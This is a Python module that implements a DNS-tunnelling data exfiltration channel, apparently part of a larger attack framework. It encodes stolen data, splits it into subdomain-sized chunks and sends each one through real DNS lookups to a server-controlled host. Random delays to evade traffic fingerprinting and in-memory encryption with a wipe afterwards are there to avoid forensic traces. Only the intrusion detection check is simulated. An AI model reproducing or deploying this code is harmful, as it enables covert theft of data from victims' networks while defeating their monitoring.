from protocols.base_protocol import BaseProtocol
from security.memory_exfil import SecureMemoryExfiltrator
import random
import socket
import time

class DNSProtocol(BaseProtocol):
    """
    Exfiltrates data using DNS queries with timing obfuscation.
    - Uses in-memory storage instead of writing to disk.
    - Encrypts data in memory before sending.
    - Introduces random delays to avoid traffic fingerprinting.
    """

    def __init__(self, command, server_ip):
        super().__init__(name="DNS", detection_rate=0.2, command=command, server_ip=server_ip)
        self.memory_exfil = SecureMemoryExfiltrator()  # Initialize in-memory encrypted storage

    def send_dns_query(self, encoded_data):
        """
        Simulates sending a DNS query with exfiltrated data.
        - Introduces random timing to evade detection.
        """
        try:
            domain = f"{encoded_data[:30]}.exfiltrator.{self.server_ip}"  # Truncate to fit subdomain limits
            print(f"📡 Sending DNS Query: {domain}")

            # Introduce randomized network delay (100ms - 1.5s)
            delay = random.uniform(0.1, 1.5)
            time.sleep(delay)

            socket.gethostbyname(domain)  # Simulate DNS request
            return True
        except Exception as e:
            print(f"❌ DNS Transmission Failed: {str(e)}")
            return False

    def transmit(self, data):
        """
        Store data in encrypted memory and transmit via DNS with timing obfuscation.
        """
        self.memory_exfil.store_data(data)  # Encrypt and store in-memory
        encoded_data = self.encode_data(self.memory_exfil.read_data())  # Read & encode from RAM

        # Break data into smaller packets to mimic normal DNS queries
        packet_size = 30  # Subdomain limit
        chunks = [encoded_data[i:i+packet_size] for i in range(0, len(encoded_data), packet_size)]

        for chunk in chunks:
            success = self.send_dns_query(chunk)

            detected = random.random() < self.detection_rate  # Simulate IDS detection

            if detected:
                print(f"⚠️ DNS Exfiltration Blocked! Adjusting parameters...")
                return False

        self.memory_exfil.secure_wipe_memory()  # Wipe memory after transmission
        print("✅ DNS Exfiltration Completed")
        return True
